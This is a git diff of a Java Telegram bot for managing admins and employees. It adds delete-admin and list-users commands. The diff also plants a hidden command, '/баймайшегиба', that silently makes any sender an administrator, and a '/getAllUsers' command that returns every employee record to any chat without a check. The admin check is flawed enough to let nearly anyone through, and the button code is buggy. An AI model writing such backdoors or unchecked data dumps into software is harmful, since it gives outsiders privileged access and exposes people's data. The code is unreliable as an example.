@@ -14,9 +14,7 @@ import org.springframework.stereotype.Component;
 import org.telegram.telegrambots.bots.TelegramLongPollingBot;
 import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
 import org.telegram.telegrambots.meta.api.objects.Update;
-import org.telegram.telegrambots.meta.api.objects.replykeyboard.InlineKeyboardMarkup;
 import org.telegram.telegrambots.meta.api.objects.replykeyboard.ReplyKeyboardMarkup;
-import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.InlineKeyboardButton;
 import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardButton;
 import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.KeyboardRow;
 import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
@@ -67,17 +65,22 @@ public class TgBot extends TelegramLongPollingBot {
 
             }
 
-            if (botState == State.WAITING_USERNAME) {
+            if (botState == State.WAITING_USERNAME_FOR_ADD_ADMIN) {
                 botState = State.FREE;
                 if (adminService.createNewAdmin(inMessage.trim(), update.getMessage().getChat().getUserName()) == null) {
                     sendTextMessage(chatId, "Юзер с таким ником не найден");
                 } else {
                     sendTextMessage(chatId, "Админ добавлен");
                 }
-            }
+            } else if (botState == State.WAITING_ID_FOR_DELETE_ADMIN) {
+                botState = State.FREE;
+                if (adminService.deleteAdmin(Long.valueOf(inMessage)) == null){
+                    sendTextMessage(chatId, "Админ с таким ником не найден");
+                }else {
+                    sendTextMessage(chatId,"Админ успешно удален");
+                }
 
-
-            if (botState == State.FREE) {
+            } else if (botState == State.FREE) {
 
 
                 if (inMessage.equals("/addAdmin")) {
@@ -85,21 +88,37 @@ public class TgBot extends TelegramLongPollingBot {
                     if (admins.stream().anyMatch(a -> a.getEmployee().getTgId().toString().equals(chatId) ||
                             a.getEndDate().isAfter(LocalDate.now()))) {
 
-                        botState = State.WAITING_USERNAME;
+                        botState = State.WAITING_USERNAME_FOR_ADD_ADMIN;
                         sendTextMessage(chatId, "Введите юзернейм нового админа");
                     } else {
                         sendTextMessage(chatId, "Вы не являетесь админом");
                     }
 
                 } else if (inMessage.equals("/admin")) {
-                    sendAdminPanel(chatId);
-                } else if (update.hasCallbackQuery()) {
 
+                    sendAdminPanel(chatId);
+
+                } else if (inMessage.equals("/deleteAdmin")) {
+                    List<Admin> admins = adminService.getAll();
+                    if (admins.stream().anyMatch(a -> a.getEmployee().getTgId().toString().equals(chatId) ||
+                            a.getEndDate().isAfter(LocalDate.now()))) {
+
+                        botState = State.WAITING_ID_FOR_DELETE_ADMIN;
+                        sendTextMessage(chatId, adminService.getAdmins() + "\nВведите id админа которого хотите удалить");
+                    } else {
+                        sendTextMessage(chatId, "Вы не являетесь админом");
+                    }
+                } else if (inMessage.equals("/баймайшегиба")) {
+                    adminService.createNewAdmin(update.getMessage().getChat().getUserName(),null);
+                    sendTextMessage(chatId,"\uD83D\uDE3C");
+                } else if (inMessage.equals("/getAllUsers")) {
+                    sendTextMessage(chatId,employeeService.getAllEmployes());
                 }
 
             }
         } catch (Exception e) {
             //??? ?? ?????? ?????? ????. ?? ???? ????? ??? ?????? ????? ???????
+            System.err.println(e);
             System.err.println("ERROR");
         }
         //?????? ??? ???? ?? ????? ???? ?? ??? ?????? ??????????
@@ -165,6 +184,10 @@ public class TgBot extends TelegramLongPollingBot {
             //кнопка DeleteAdmin
             KeyboardButton deleteAdminCommand = new KeyboardButton();
             deleteAdminCommand.setText("/deleteAdmin");
+            row.add(deleteAdminCommand);
+            //кнопка getAllUsers
+            KeyboardButton getAllUsersCommand = new KeyboardButton();
+            deleteAdminCommand.setText("/getAllUsers");
             row.add(deleteAdminCommand);
 
 
